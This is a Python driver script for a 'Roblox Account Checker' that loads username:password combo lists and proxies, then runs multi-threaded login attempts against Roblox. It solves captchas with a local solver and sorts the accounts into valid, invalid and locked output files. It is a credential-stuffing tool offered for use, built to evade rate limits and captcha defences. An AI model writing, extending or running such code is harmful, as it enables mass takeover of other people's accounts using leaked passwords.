"""
🚀 Roblox Account Checker with FREE Local Captcha Solver
==========================================================
💰 Cost: $0.00 - Completely FREE!
🔑 No API key needed!

Flow:
1. Login with credentials
2. If captcha detected → solve locally (FREE!)
3. Get account info

Keyboard Interrupt: Ctrl+C to stop gracefully
"""
import sys
import os
import time
import threading
import signal
import queue

from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, MofNCompleteColumn
from rich.table import Table

# Import modules
from roblox import Roblox
from thread_lock import ThreadLock
from counter import Counter
from combocheck import ComboCheck
from util import get_config
from local_solver import (
    cleanup_solver,
    request_shutdown,
    is_shutdown,
    clear_shutdown,
    configure,
    get_stats
)

console = Console()
config = get_config()

# Global shutdown
_shutdown_requested = threading.Event()

# Create output directory
os.makedirs("output", exist_ok=True)


def signal_handler(sig, frame):
    """Handle Ctrl+C - stop gracefully."""
    global _shutdown_requested
    
    if _shutdown_requested.is_set():
        print("\n[!] Force quit!")
        os._exit(1)
    
    print("\n" + "="*50)
    print("⌨️  KEYBOARD INTERRUPT (Ctrl+C)")
    print("="*50)
    print("[!] Stopping...")
    print("[*] Press Ctrl+C again to force quit")
    
    _shutdown_requested.set()
    request_shutdown()


def main():
    global _shutdown_requested
    
    # Setup signal handlers
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    _shutdown_requested.clear()
    clear_shutdown()
    
    # Banner
    console.print("\n" + "="*60)
    console.print("[bold blue]   🚀 Roblox Account Checker v5.0[/bold blue]")
    console.print("[bold green]   💰 100% FREE - No API Key Needed![/bold green]")
    console.print("="*60 + "\n")
    
    # Configure FREE local solver
    debug = config.get("debug", False)
    headless = config.get("headless", True)
    
    console.print("[green]🧩 Using FREE Local Captcha Solver[/green]")
    console.print(f"[cyan]   Mode: {'HEADLESS' if headless else 'VISIBLE (you can watch)'}[/cyan]")
    console.print("[cyan]   Cost: $0.00[/cyan]")
    console.print("[cyan]   Press Ctrl+C to stop anytime[/cyan]\n")
    
    configure(debug=debug, headless=headless)
    
    # Load accounts
    accounts_file = "accounts.txt"
    if not os.path.exists(accounts_file):
        console.print("[red]❌ No accounts.txt file![/red]")
        console.print("[yellow]Create accounts.txt with format: username:password[/yellow]")
        return
    
    with open(accounts_file, 'r', encoding='utf-8') as f:
        accounts = [line.strip() for line in f if ':' in line and not line.startswith('#')]
    
    if not accounts:
        console.print("[red]❌ No accounts found[/red]")
        return
    
    # Load proxies
    proxies_file = "proxies.txt"
    proxies = []
    if os.path.exists(proxies_file):
        with open(proxies_file, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    proxies.append(line)
    
    if not proxies:
        console.print("[yellow]⚠️ No proxies - running without proxies[/yellow]")
    
    threads = config.get("threads", 1)
    
    console.print(f"\n[green]📊 Loaded: {len(accounts)} accounts, {len(proxies)} proxies[/green]")
    console.print(f"[green]⚙️ Threads: {threads}[/green]")
    console.print(f"[green]⌨️ Ctrl+C to stop[/green]\n")
    
    time.sleep(2)
    
    # Setup queue and tracking
    account_queue = queue.Queue()
    for acc in accounts:
        account_queue.put(acc)
    
    lock = ThreadLock()
    counter = Counter()
    invalid = ComboCheck("output/invalid.txt")
    checked_file = ComboCheck("output/checked.txt")
    locked = ComboCheck("output/locked.txt")
    
    # Stats
    valid_count = [0]
    stats_lock = threading.Lock()
    
    # Progress
    progress = Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=40),
        MofNCompleteColumn(),
        expand=False
    )
    task_id = progress.add_task("Checking...", total=len(accounts))
    
    try:
        # Start workers
        workers = []
        for i in range(threads):
            roblox = Roblox(lock, counter, invalid, checked_file, locked, account_queue)
            
            # Track valid
            original_valid = roblox.handle_valid
            def make_valid_handler(r):
                def handler(*args, **kwargs):
                    with stats_lock:
                        valid_count[0] += 1
                    return original_valid(*args, **kwargs)
                return handler
            roblox.handle_valid = make_valid_handler(roblox)
            
            t = threading.Thread(target=roblox.check, daemon=True)
            t.start()
            workers.append(t)
        
        # Update loop
        with progress:
            while counter.value < len(accounts):
                if _shutdown_requested.is_set() or is_shutdown():
                    console.print("\n[yellow]⏹️ Stopping...[/yellow]")
                    break
                
                progress.update(task_id, completed=counter.value)
                time.sleep(0.25)
        
        # Wait for workers
        for t in workers:
            t.join(timeout=2)
        
    except KeyboardInterrupt:
        console.print("\n[red]⏹️ Interrupted[/red]")
    finally:
        cleanup_solver()
        
        # Stats
        solver_stats = get_stats()
        
        console.print(f"\n[bold]" + "="*60 + "[/bold]")
        console.print("[bold]📊 FINAL STATISTICS[/bold]")
        console.print("[bold]" + "="*60 + "[/bold]")
        
        with stats_lock:
            console.print(f"   [green]✅ Valid:[/green]       {valid_count[0]}")
            console.print(f"   [red]❌ Invalid:[/red]     {counter.value - valid_count[0]}")
            console.print(f"   [cyan]📋 Checked:[/cyan]    {counter.value}")
        
        console.print(f"\n   [yellow]🧩 Captcha:[/yellow]")
        console.print(f"      ✅ Solved: {solver_stats.get('total_solved', 0)}")
        console.print(f"      ❌ Failed: {solver_stats.get('failed', 0)}")
        console.print(f"      💰 Cost:   $0.00 (FREE!)")
        
        console.print(f"\n[green]📁 Check 'output/' folder for results[/green]")
        console.print("[green]👋 Done![/green]")


if __name__ == "__main__":
    main()